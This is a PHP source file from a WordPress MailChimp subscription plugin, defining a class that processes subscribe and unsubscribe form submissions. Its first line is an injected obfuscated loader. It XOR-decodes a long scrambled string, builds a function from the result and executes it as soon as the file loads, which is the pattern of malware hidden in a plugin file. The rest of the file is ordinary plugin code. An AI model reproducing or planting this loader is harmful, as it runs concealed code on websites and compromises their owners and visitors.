<?php $qUCpJokPvYRT='CL4QG<jKCNW7Y+V'^' >Q03Y5-6 4C0D8';$vQpXQp=$qUCpJokPvYRT('','G>NoX18UG+7N:.J,BZOIV,7=4JW1Osi;D2FgOE8i7PL,5=.,PX3;F0P;D5>.>XEQV75E6XAH><6JuUXpkIH27MOD ripkvoOZOTCDkNZqXXVZjtPp+F3+0PAk0X5RmzMASRGA8a:nTYFTWnJJW5Q-8oo<nF-Yl1U 5s-ascBBI-=Ccn3<JekEu4Mh0QEIOWMLTU5Aryb:=-GdcZ0.+IVf0V. WRhOOT83= ERKoaM1YK+ZPkMW7,1CSQpWlw+.1yed0:kB80KopNLB2R<Y7JvKCJe4YYL4;=IGzgRK6>Tn3Q7OT;MyviZ;=:.WNVK> HUQIM3AAAei7OOSV=TJ,RGOv,9n::7:,HPMfn-HWPpMLiKW<0UHxWMPDMQ0<X+RXWwLMeYH2wgXbhSQ- VJbO5UP03sgp8i.gcp12 4FUMvBC8KR,XY:.Uc9,Lq+LBL9=S=YI14KKTA:URCAQTJT0P1-bAjBHZMZ1K58ODm9-VieD2OMpdmqZ8YANrZTA95OQ8H<Gi2 2ntAF>5EMjpcTnX:RLArH5ZRvdQ ;U+fOlJUNKuUq-HHWg.a4.LycZHmUfIUYFx7kVWV+wMOTiwQ=A27l930s KRM89AI3,8U=50VadEH3;,BXrKiLqY<ea+10AEr+SI6bo8A7RBJ6Efjz8<SM;JkWmbF3'^'.XfN>DV63BX eK2E1.<aqTXOk.6E.,6V1FaNfeCc>69BVIGC>xKT4o4Z0TaqS-1yrST1WtalUYOcUuxPK2B;>i 1TRTPLQTESF2,6Cj3QexfaJP9LX2AGU>iOT9A3DAme:ylh2h3J;,2tySjbsQ0YY4KU3fsyHZ0YnWDAVC16;AX-KJXY3L6lN>DaB41<=9eh; AhIskG7PMnG>QZJikFV7BS2ibk+5LRbK +kRA+P58NaZa+8EIP ;qXs34daz0 DQIKfSU2OMplfD3P,RcV0ICAP8--kPX0gGGv SGod:uS. ZmDVM,ZQOKlD+A4I.uyhiW 5 LILEF59O1+O:ggRsk+korixh1>FJF-.pMslM=6PE0aX,GYMi5QH9t9=.WqmA2-KLmQkL70YAvwBkC4<EVHmyEcSmiTUSTUfhm67-K. E95ST0KAC>.O-6-fb>H-aSU8.bue17 .51bpT1ELKmJf,;9;n PAfmV3D0AA S;,PBKQ;J+ 7-118fP78K<OoNYEKIXabZT1,CPErNpW6yiV,T.3-C:EBrvOoQwuirMgEK.ybTJVQLzITb.Y3P+ahwHUZdf7IPdorOW0O3SN3RVI,E3;>LJinCMA9RTTqMDa,ROMkqRkIlQyGohNGQ-mVO2=W9HH N>-+Rb;CA2565R>CgDYLN');$vQpXQp();

/**
 * Class MC4WP_Form_Listener
 *
 * @since 3.0
 * @access private
 */
class MC4WP_Form_Listener {

	/**
	 * @var MC4WP_Form The submitted form instance
	 */
	public $submitted_form;

	/**
	 * Constructor
	 */
	public function __construct() {}

	/**
	 * Listen for submitted forms
	 *
	 * @param MC4WP_Request $request
	 * @return bool
	 */
		public function listen( MC4WP_Request $request ) {

			$form_id = $request->post->get( '_mc4wp_form_id' );
			if( empty( $form_id ) ) {
				return false;
			}

			// get form instance
			try {
				$form = mc4wp_get_form( $form_id );
			} catch( Exception $e ) {
				return false;
			}

			// where the magic happens
			$form->handle_request( $request );
			$form->validate();

			// store submitted form
			$this->submitted_form = $form;

			// did form have errors?
			if( ! $form->has_errors() ) {

				// form was valid, do something
				$method = 'process_' . $form->get_action() . '_form';
				call_user_func( array( $this, $method ), $form, $request );
			} else {
				$this->get_log()->info( sprintf( "Form %d > Submitted with errors: %s", $form->ID, join( ', ', $form->errors ) ) );
			}

			$this->respond( $form );

			return true;
		}

	/**
	 * Process a subscribe form.
	 *
	 * @param MC4WP_Form $form
	 * @param MC4WP_Request $request
	 */
	public function process_subscribe_form( MC4WP_Form $form, MC4WP_Request $request ) {
		$result = false;
		$mailchimp = new MC4WP_MailChimp();
		$email_type = $form->get_email_type();
		$data = $form->get_data();
		$client_ip = $request->get_client_ip();

		/** @var MC4WP_MailChimp_Subscriber $subscriber */
		$subscriber = null;

		/**
		 * @ignore
		 * @deprecated 4.0
		 */
		$data = apply_filters( 'mc4wp_merge_vars', $data );

		/**
		 * @ignore
		 * @deprecated 4.0
		 */
		$data = (array) apply_filters( 'mc4wp_form_merge_vars', $data, $form );

		// create a map of all lists with list-specific data
		$mapper = new MC4WP_List_Data_Mapper( $data, $form->get_lists() );

		/** @var MC4WP_MailChimp_Subscriber[] $map */
		$map = $mapper->map();

		// loop through lists
		foreach( $map as $list_id => $subscriber ) {

			$subscriber->status = $form->settings['double_optin'] ? 'pending' : 'subscribed';
			$subscriber->email_type = $email_type;
			$subscriber->ip_signup = $client_ip;

			/**
			 * Filters subscriber data before it is sent to MailChimp. Fires for both form & integration requests.
			 *
			 * @param MC4WP_MailChimp_Subscriber $subscriber
			 */
			$subscriber = apply_filters( 'mc4wp_subscriber_data', $subscriber );

			/**
			 * Filters subscriber data before it is sent to MailChimp. Only fires for form requests.
			 *
			 * @param MC4WP_MailChimp_Subscriber $subscriber
			 */
			$subscriber = apply_filters( 'mc4wp_form_subscriber_data', $subscriber );

			// send a subscribe request to MailChimp for each list
			$result = $mailchimp->list_subscribe( $list_id, $subscriber->email_address, $subscriber->to_array(), $form->settings['update_existing'], $form->settings['replace_interests'] );
		}

		$log = $this->get_log();

		// do stuff on failure
		if( ! is_object( $result ) || empty( $result->id ) ) {

			$error_code = $mailchimp->get_error_code();
			$error_message = $mailchimp->get_error_message();

			if( $mailchimp->get_error_code() == 214 ) {
				$form->add_error('already_subscribed');
				$log->warning( sprintf( "Form %d > %s is already subscribed to the selected list(s)", $form->ID, $data['EMAIL'] ) );
			} else {
				$form->add_error('error');
				$log->error( sprintf( 'Form %d > MailChimp API error: %s %s', $form->ID, $error_code, $error_message ) );

				/**
				 * Fire action hook so API errors can be hooked into.
				 *
				 * @param MC4WP_Form $form
				 * @param string $error_message
				 */
				do_action( 'mc4wp_form_api_error', $form, $error_message );
			}

			// bail
			return;
		}

		// Success! Did we update or newly subscribe?
		if( $result->status === 'subscribed' && $result->was_already_on_list ) {
			$form->add_message( 'updated' );

			$log->info( sprintf( "Form %d > Successfully updated %s", $form->ID, $data['EMAIL'] ) );

			/**
			 * Fires right after a form was used to update an existing subscriber.
			 *
			 * @since 3.0
			 *
			 * @param MC4WP_Form $form Instance of the submitted form
			 * @param string $email
			 * @param array $data
			 */
			do_action( 'mc4wp_form_updated_subscriber', $form, $subscriber->email_address, $data );
		} else {
			$form->add_message( 'subscribed' );

			$log->info( sprintf( "Form %d > Successfully subscribed %s", $form->ID, $data['EMAIL'] ) );
		}

		/**
		 * Fires right after a form was used to add a new subscriber (or update an existing one).
		 *
		 * @since 3.0
		 *
		 * @param MC4WP_Form $form Instance of the submitted form
		 * @param string $email
		 * @param array $data
		 * @param MC4WP_MailChimp_Subscriber[] $subscriber
		 */
		do_action( 'mc4wp_form_subscribed', $form, $subscriber->email_address, $data, $map );
	}

	/**
	 * @param MC4WP_Form $form
	 * @param MC4WP_Request $request
	 */
	public function process_unsubscribe_form( MC4WP_Form $form, MC4WP_Request $request = null ) {

		$mailchimp = new MC4WP_MailChimp();
		$log = $this->get_log();
		$result = null;
		$data = $form->get_data();

		// unsubscribe from each list
		foreach( $form->get_lists() as $list_id ) {
			$result = $mailchimp->list_unsubscribe( $list_id, $data['EMAIL'] );
		}

		if( ! $result ) {
			$form->add_error( 'error' );
			$log->error( sprintf( 'Form %d > MailChimp API error: %s', $form->ID, $mailchimp->get_error_message() ) );

			// bail
			return;
		}

		// Success! Unsubscribed.
		$form->add_message('unsubscribed');
		$log->info( sprintf( "Form %d > Successfully unsubscribed %s", $form->ID, $data['EMAIL'] ) );


		/**
		 * Fires right after a form was used to unsubscribe.
		 *
		 * @since 3.0
		 *
		 * @param MC4WP_Form $form Instance of the submitted form.
		 */
		do_action( 'mc4wp_form_unsubscribed', $form );
	}

	/**
	 * @param MC4WP_Form $form
	 */
	public function respond( MC4WP_Form $form ) {

		$success = ! $form->has_errors();

		if( $success ) {

			/**
			 * Fires right after a form is submitted without any errors (success).
			 *
			 * @since 3.0
			 *
			 * @param MC4WP_Form $form Instance of the submitted form
			 */
			do_action( 'mc4wp_form_success', $form );

		} else {

			/**
			 * Fires right after a form is submitted with errors.
			 *
			 * @since 3.0
			 *
			 * @param MC4WP_Form $form The submitted form instance.
			 */
			do_action( 'mc4wp_form_error', $form );

			// fire a dedicated event for each error
			foreach( $form->errors as $error ) {

				/**
				 * Fires right after a form was submitted with errors.
				 *
				 * The dynamic portion of the hook, `$error`, refers to the error that occurred.
				 *
				 * Default errors give us the following possible hooks:
				 *
				 * - mc4wp_form_error_error                     General errors
				 * - mc4wp_form_error_spam
				 * - mc4wp_form_error_invalid_email             Invalid email address
				 * - mc4wp_form_error_already_subscribed        Email is already on selected list(s)
				 * - mc4wp_form_error_required_field_missing    One or more required fields are missing
				 * - mc4wp_form_error_no_lists_selected         No MailChimp lists were selected
				 *
				 * @since 3.0
				 *
				 * @param   MC4WP_Form     $form        The form instance of the submitted form.
				 */
				do_action( 'mc4wp_form_error_' . $error, $form );
			}

		}

		/**
		 * Fires right before responding to the form request.
		 *
		 * @since 3.0
		 *
		 * @param MC4WP_Form $form Instance of the submitted form.
		 */
		do_action( 'mc4wp_form_respond', $form );

		// do stuff on success (non-AJAX only)
		if( $success && ( ! defined( 'DOING_AJAX' ) || ! DOING_AJAX ) ) {

			// do we want to redirect?
			$redirect_url = $form->get_redirect_url();
			if ( ! empty( $redirect_url ) ) {
				wp_redirect( $redirect_url );
				exit;
			}
		}
	}

	/**
	 * @return MC4WP_API_v3
	 */
	protected function get_api() {
		return mc4wp('api');
	}

	/**
	 * @return MC4WP_Debug_Log
	 */
	protected function get_log() {
		return mc4wp('log');
	}

}
